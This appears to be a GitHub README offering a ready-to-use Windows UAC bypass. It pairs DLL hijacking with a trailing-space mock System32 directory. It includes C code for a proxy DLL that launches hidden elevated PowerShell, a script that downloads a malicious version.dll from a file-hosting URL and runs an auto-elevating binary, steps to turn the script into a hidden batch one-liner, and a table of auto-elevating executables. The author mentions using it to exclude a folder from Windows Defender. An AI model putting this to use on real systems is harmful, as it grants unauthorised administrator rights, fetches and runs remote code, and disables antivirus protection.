# Powershell UAC bypass
Originally discovered by Daniel Gebert

---

<details open="open">
  <summary>Table of Contents</summary>
  <ol>
    <li>
      <a href="#deployment">Deployment</a>
    </li>
        <li>
      <a href="#explanations">Explanations</a>
          <ul>
        <li><a href="#what-is-uac">What is UAC?</a></li>
        <li><a href="#dll-hijacking">DLL Hijacking</a></li>
        <li><a href="#mock-directories">Mock Directories</a></li>
    </ul>
    </li>
    <li><a href="#auto-elavate-applications">Auto elavate applications</a></li>
    
  </ol>
</details>

---


# Deployment

First edit the file to download your malicous DLL from [Filebin](https://filebin.net/)\
To easiliy create said DLL  - I would modify [This template](https://github.com/zeffy/prxdll_templates/tree/master/prxdll_version) with the code below

dllmain.c
```c++
#include "pch.h"
#include "prxdll.h"
#include "windows.h"
BOOL APIENTRY DllMain(
	const HINSTANCE instance,
	const DWORD reason,
	const PVOID reserved)
{
	switch (reason) {
	case DLL_PROCESS_ATTACH:
		WinExec("powershell -NoProfile -ExecutionPolicy bypass -windowstyle hidden -Command \"Start-Process -verb runas powershell\" \"'-NoProfile -windowstyle hidden -ExecutionPolicy bypass -Command YOURPOWERSHELLCOMMANDHERE\" '\"", 1);
		DisableThreadLibraryCalls(instance);
		return prx_attach(instance);
	case DLL_PROCESS_DETACH:
		prx_detach(reserved);
		break;
	}
	return TRUE;
}
```
This should execute some powershell code as admin.\
Next we need to find some autoelavate applications. I prefer to use winSAT.exe as there is no visual GUI when ran. Heres some other <a href="#auto-elavate-applications">Auto elavate applications</a>.

Okay so the you need to edit the powershell source code
```powershell
New-Item '\\?\C:\Windows \System32' -ItemType Directory
Set-Location -Path '\\?\C:\Windows \System32'
copy C:\Windows\System32\WinSAT.exe "C:\windows \System32\winSAT.exe"
Invoke-WebRequest -Uri 'https://filebin.net/bajzrgruy6h83o4n/version.dll' -OutFile 'version.dll'
Start-Process -Filepath 'C:\windows \System32\winSAT.exe'
Start-Sleep -s 1
Remove-Item '\\?\C:\Windows \' -Force -Recurse
```
First modification:\
Build your DLL using visual studio code and upload it to filebin. My DLL adds a windows defender preference to not scan the TEMP directory\
Replace the Invoke-WebRequest Uri with your link and replace the copy argument with the location of your windows application.\
Now for the final step - Replace every new line with a semicolon and convert it into a batch script
```cmd
powershell.exe -windowstyle hidden -NoProfile -ExecutionPolicy bypass -Command "Yourcodehere"
```
And boom! You can execute that system command bypass UAC!

Remember - you can program this into most high level languages - as all you need to do is execute a system command!

---
<br>

## Explanations

## What Is UAC
Microsoft introduced UAC (User Account Control) with Windows Vista and Windows Server 2008.\
In short terms - UAC aims to improve the security of Microsoft Windows by giving programs standard user privileges until an administrator authorizes an increase or elevation of permissions.  [Wikipedia](https://en.wikipedia.org/wiki/User_Account_Control#Features)

<br>

## DLL Hijacking
DLL Hijacking means a program will load and execute a malicious DLL contained in the same folder as a data file opened by these programs.
[Wikipedia](https://en.wikipedia.org/wiki/Dynamic-link_library#DLL_hijacking)

<br>

## Mock directories
Heres a description I stole from [daniels blog](http://daniels-it-blog.blogspot.com/2020/07/uac-bypass-via-dll-hijacking-and-mock.html)

Mock directories are folders with a trailing space. For example \
```
C:\Windows \System32
```


See the space " " between "Windows" and "\System32".\


##  Auto elavate applications
<table bgcolor="" cellpadding="2" cellspacing="0" style="background: rgb(255, 255, 255); width: 643px;">
	<colgroup><col width="341">
	<col width="75">
	<col width="213">
	</colgroup><tbody><tr bgcolor="" style="background: rgb(229, 229, 229);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<strong><font color="#000000"><font face="">Executable</font></font></strong></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<strong><font color="#000000"><font face="">DLL</font></font></strong></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<strong><font color="#000000"><font face="">Comment</font></font></strong></p>
		</td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">ComputerDefaults.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Can
			also bypass UAC using other methods.</font></font></p>
		</td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">EASPolicyManagerBrokerHost.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">fodhelper.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Opens
			settings and can be used to bypass UAC using other methods</font></font></p>
		</td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">FXSUNATD.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">msconfig.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Can
			also bypass UAC using other methods</font></font></p>
		</td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">OptionalFeatures.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Opens
			Windows Optional Features</font></font></p>
		</td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">sdclt.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Can
			also bypass UAC using other methods; opens Windows Backup</font></font></p>
		</td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">ServerManager.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">ServerManager.exe
			is not present by default</font></font></p>
		</td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">systemreset.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">sysprep.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Creates
			sub folder.&nbsp;</font></font><strong><font color="#000000"><font face="">Sysprep
			process has to be killed directly after UAC bypass, otherwise
			sysprep is executed!</font></font></strong></p>
		</td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">SystemSettingsAdminFlows.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">WinSAT.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">version.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"></td>
	</tr>
	<tr bgcolor="" style="background: rgb(247, 247, 247);">
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="341"><p align="left">
			<font color="#555555"><font face="">WSReset.exe</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="75"><p align="left">
			<font color="#555555"><font face="">profapi.dll</font></font></p>
		</td>
		<td style="border: 1px solid rgb(220, 220, 220); padding: 0.02in;" width="213"><p align="left">
			<font color="#555555"><font face="">Opens
			Windows Store</font></font></p>
		</td>
	</tr>
</tbody></table>
